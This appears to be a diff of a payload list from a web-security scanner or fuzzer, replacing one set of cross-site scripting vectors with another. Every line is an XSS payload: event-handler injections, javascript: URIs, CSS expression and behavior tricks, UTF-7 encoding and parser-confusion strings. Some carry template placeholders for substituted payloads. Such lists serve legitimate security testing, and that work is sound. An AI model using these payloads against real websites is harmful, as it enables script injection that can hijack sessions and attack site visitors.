@@ -1,42 +1,44 @@
-`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
-<script>javascript:alert(1)<\x00/script>
-<img src=# onerror\x3D"javascript:alert(1)" >
-<input onfocus=javascript:alert(1) autofocus>
-<input onblur=javascript:alert(1) autofocus><input autofocus>
-<video poster=javascript:javascript:alert(1)//
-<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
-<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
-<video><source onerror="javascript:javascript:alert(1)">
-<video onerror="javascript:javascript:alert(1)"><source>
-<form><button formaction="javascript:javascript:alert(1)">X
-<body oninput=javascript:alert(1)><input autofocus>
-<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
-<frameset onload=javascript:alert(1)>
-<table background="javascript:javascript:alert(1)">
-<!--<img src="--><img src=x onerror=javascript:alert(1)//">
-<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
-<![><img src="]><img src=x onerror=javascript:alert(1)//">
-<style><img src="</style><img src=x onerror=javascript:alert(1)//">
-<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>
-<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>
-<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
-<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
-<object data="data:text/html;base64,%(base64)s">
-<embed src="data:text/html;base64,%(base64)s">
-<b <script>alert(1)</script>0
-<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
-<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
-<embed src="javascript:alert(1)">
-<img src="javascript:alert(1)">
-<image src="javascript:alert(1)">
-<script src="javascript:alert(1)">
-<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
-<? foo="><script>javascript:alert(1)</script>">
-<! foo="><script>javascript:alert(1)</script>">
-</ foo="><script>javascript:alert(1)</script>">
-<? foo="><x foo='?><script>javascript:alert(1)</script>'>">
-<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
-<% foo><x foo="%><script>javascript:alert(1)</script>">
-<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
-<img \x00src=x onerror="alert(1)">
-<img \x47src=x onerror="javascript:alert(1)">
+<SCRIPT SRC=%(jscript)s?<B>
+<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>
+<BODY ONLOAD=javascript:alert(1)>
+<BODY ONLOAD=javascript:javascript:alert(1)>
+<IMG SRC="jav    ascript:javascript:alert(1);">
+<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>
+<SCRIPT/SRC="%(jscript)s"></SCRIPT>
+<<SCRIPT>%(payload)s//<</SCRIPT>
+<IMG SRC="javascript:javascript:alert(1)"
+<iframe src=%(scriptlet)s <
+<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
+<IMG DYNSRC="javascript:javascript:alert(1)">
+<IMG LOWSRC="javascript:javascript:alert(1)">
+<BGSOUND SRC="javascript:javascript:alert(1);">
+<BR SIZE="&{javascript:alert(1)}">
+<LAYER SRC="%(scriptlet)s"></LAYER>
+<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
+<STYLE>@import'%(css)s';</STYLE>
+<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
+<XSS STYLE="behavior: url(%(htc)s);">
+<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
+<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
+<TABLE BACKGROUND="javascript:javascript:alert(1)">
+<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
+<DIV STYLE="background-image: url(javascript:javascript:alert(1))">
+<DIV STYLE="width:expression(javascript:alert(1));">
+<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
+<XSS STYLE="xss:expression(javascript:alert(1))">
+<STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
+<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
+<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
+<BASE HREF="javascript:javascript:alert(1);//">
+<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
+<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
+<SCRIPT SRC="%(jpg)s"></SCRIPT>
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
+<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
+<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
